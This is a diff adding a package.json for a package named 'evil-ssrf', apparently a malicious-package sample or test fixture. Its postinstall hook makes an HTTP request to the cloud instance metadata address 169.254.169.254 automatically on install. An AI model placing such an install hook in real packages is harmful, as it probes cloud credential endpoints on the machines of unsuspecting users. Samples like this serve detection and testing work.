@@ -1,0 +1,7 @@
+{
+  "name": "evil-ssrf",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e 'require(\"http\").get(\"http://169.254.169.254/latest/meta-data/\")'"
+  }
+}
